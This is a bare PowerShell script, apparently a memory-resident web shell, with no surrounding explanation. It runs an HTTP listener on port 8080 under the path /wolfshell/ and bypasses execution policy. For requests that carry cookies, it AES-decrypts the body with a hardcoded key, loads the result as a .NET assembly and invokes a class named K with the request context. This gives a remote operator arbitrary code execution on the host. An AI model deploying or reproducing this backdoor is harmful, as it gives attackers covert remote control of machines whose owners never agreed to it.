# C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File httpser.ps1


$l = New-Object System.Net.HttpListener
$l.Prefixes.Add("http://+:8080/wolfshell/")
$l.Start()

while ($l.IsListening) {
    $c = $l.GetContext()
    $q = $c.Request
    $s = $c.Response

    try {
        if ($q.Cookies.Count -ne 0) {
            $k = [System.Text.Encoding]::Default.GetBytes("ca63457538b9b1e0")
            $i = $q.InputStream
            $b = New-Object byte[] $q.ContentLength64
            $i.Read($b, 0, $b.Length)

            $r = New-Object System.Security.Cryptography.RijndaelManaged
            $d = $r.CreateDecryptor($k, $k)
            $f = $d.TransformFinalBlock($b, 0, $b.Length)

            $a = [System.Reflection.Assembly]::Load($f)
            $o = $a.CreateInstance("K")
            $o.Equals($c)
        }
        $s.StatusCode = 200
    } catch {
        $s.StatusCode = 500
    } finally {
        $s.Close()
    }
}